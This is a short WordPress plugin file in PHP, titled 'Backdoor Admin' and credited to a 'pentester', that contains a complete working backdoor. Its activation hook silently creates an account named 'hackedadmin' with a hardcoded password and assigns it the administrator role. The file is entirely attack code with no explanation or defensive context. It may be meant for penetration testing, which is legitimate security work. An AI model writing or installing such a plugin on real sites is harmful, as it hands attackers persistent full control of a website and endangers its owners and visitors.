<?php
/*
Plugin Name: Backdoor Admin
Description: Creates an admin user upon activation.
Version: 1.0
Author: pentester
*/

register_activation_hook(__FILE__, 'bd_create_admin');

function bd_create_admin() {
    $user = 'hackedadmin';
    $pass = 'hackedpassword123';
    $email = 'hacker@example.com';

    if (!username_exists($user)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
?>
